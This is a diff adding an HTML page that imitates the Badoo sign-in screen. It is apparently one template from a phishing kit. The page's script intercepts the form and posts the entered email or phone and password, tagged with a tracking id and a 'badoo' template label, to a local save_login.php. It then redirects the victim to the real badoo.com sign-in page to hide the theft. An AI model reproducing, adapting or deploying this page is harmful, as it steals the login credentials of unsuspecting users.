@@ -1,0 +1,40 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Badoo</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#7000ff,#a855f7);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;width:100%;max-width:380px;border-radius:16px;padding:36px}
+.bd{font-size:34px;font-weight:800;color:#7000ff;text-align:center;margin-bottom:20px}
+input{width:100%;height:48px;border:1px solid #e5e5e5;border-radius:24px;padding:0 18px;margin-bottom:12px;font-size:15px}
+.btn-submit{width:100%;height:48px;background:#7000ff;color:#fff;border:none;border-radius:24px;font-weight:700;cursor:pointer}
+</style></head><body><div class="card"><div class="bd">badoo</div><form id="loginForm"><input type="text" id="email" placeholder="Email or phone" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "badoo" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/badoo.com\/signin"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
